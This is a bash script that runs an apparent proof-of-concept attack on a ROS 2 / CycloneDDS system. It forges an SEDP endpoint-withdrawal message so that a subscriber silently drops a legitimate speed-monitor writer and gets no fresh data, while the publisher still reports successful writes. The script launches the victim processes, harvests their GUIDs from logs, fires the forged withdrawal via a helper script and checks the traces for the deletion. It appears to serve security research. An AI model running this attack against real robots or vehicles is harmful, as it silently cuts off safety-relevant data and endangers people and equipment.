#!/usr/bin/env bash
# Module 1 end-to-end: silent freshness-loss injection via forged SEDP withdrawal.
set +u
cd "$(dirname "$0")"
source /opt/ros/humble/setup.bash 2>/dev/null
export LD_LIBRARY_PATH=/opt/ros/humble/lib/x86_64-linux-gnu:/opt/ros/humble/lib:$LD_LIBRARY_PATH
export CYCLONEDDS_URI="file://$PWD/cyclonedds_trace.xml"
rm -f logs/*.log logs/*.trace
CDDS_TRACE_FILE="$PWD/logs/consumer.trace" ./build/trusting_consumer  > logs/consumer.log 2>&1 & CPID=$!
sleep 0.4
CDDS_TRACE_FILE="$PWD/logs/monitor.trace"  ./build/real_speed_monitor > logs/monitor.log  2>&1 & MPID=$!
CDDS_TRACE_FILE="$PWD/logs/injector.trace" ./build/injector_presence  > logs/injector.log 2>&1 & IPID=$!
# let discovery settle
sleep 2.0
TARGET=$(grep -m1 WRITER_GUID   logs/monitor.log  | awk '{print $2}' | tr -d ':')
CONS=$(  grep -m1 CONSUMER_PREFIX logs/consumer.log | awk '{print $2}')
INJ=$(   grep -m1 INJECTOR_PREFIX logs/injector.log | awk '{print $2}')
echo "TARGET writer GUID = $TARGET"
echo "CONSUMER prefix    = $CONS"
echo "INJECTOR prefix    = $INJ"
RX_BEFORE=$(grep -c 'event=SAMPLE' logs/consumer.log)
echo "--- consumer samples before injection: $RX_BEFORE ---"
echo "=== FIRING FORGED WITHDRAWAL ==="
python3 inject/forge_withdraw.py --src "$INJ" --dst "$CONS" --target "$TARGET" --repeat 3 2>&1 | sed 's/^/  /'
# observe aftermath
sleep 2.5
kill -INT $MPID $IPID $CPID 2>/dev/null; sleep 0.4; kill -9 $MPID $IPID $CPID 2>/dev/null
echo "=== RESULTS ==="
echo "monitor last TX lines:"; grep '^TX' logs/monitor.log | tail -2 | sed 's/^/  /'
echo "monitor still OK after inject? write_rc tail:"; grep -c 'write_rc=OK' logs/monitor.log
echo "consumer: last SAMPLE + any STALE/RECOVER after injection:"
grep -nE 'event=(SAMPLE|STALE|RECOVER)' logs/consumer.log | tail -8 | sed 's/^/  /'
echo "consumer trace: SEDP dead-endpoint delete of target?"
grep -nE 'delete_proxy_writer|SEDP ST3|handle_sedp|'"${TARGET:24:8}"'' logs/consumer.trace | grep -iE 'delete|ST3|203' | tail -10 | sed 's/^/  /'
